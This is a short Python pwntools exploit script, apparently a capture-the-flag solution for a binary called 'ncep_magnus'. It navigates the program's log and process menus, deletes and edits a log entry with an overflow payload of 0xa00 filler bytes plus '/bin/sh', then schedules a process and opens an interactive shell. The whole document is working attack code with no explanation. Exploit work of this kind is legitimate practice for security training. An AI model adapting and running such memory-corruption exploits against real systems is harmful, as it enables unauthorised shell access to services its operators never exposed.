from pwn import *
from time import *

io = remote()
#io = process("./ncep_magnus")


payload = b"A"*0xa00 + b'/bin/sh\x00'

print(io.recvuntil("permitted by law.").decode())


#quit out of the first couple games
io.sendline()
sleep(5)
print(io.recv(timeout=1))
io.sendline()
sleep(5)
print(io.recv(timeout=1))

sleep(5)
#Open up the log menu
io.sendline("INT1")

#add new process log
print(io.recvuntil("5. EXIT").decode())
print(io.recvline().decode())
io.sendline("2")


#delete second to last log
print(io.recvuntil("5. EXIT").decode())
print(io.recvline().decode())
io.sendline("4")
print(io.recv(timeout=1).decode())
io.sendline("4")

#edit process log
print(io.recvuntil("5. EXIT").decode())
print(io.recvline().decode())
io.sendline("3")
print(io.recv(timeout=1).decode())
io.sendline("4")
print(io.recvuntil("4. UPDATE DESCRIPTION").decode())
io.sendline("4")

#enter payload
print(io.recv(timeout=1).decode())
io.sendline(payload)

#exit log menu
print(io.recvuntil("5. EXIT").decode())
print(io.recvline().decode())
io.sendline("5")

#open process menu
print(io.recv().decode())
sleep(5)
io.sendline("INT2")

#allocate new process
print(io.recv(timeout=1).decode())
io.sendline("1")

#schedule process
print(io.recv(timeout=1).decode())
io.sendline("3")

io.interactive()
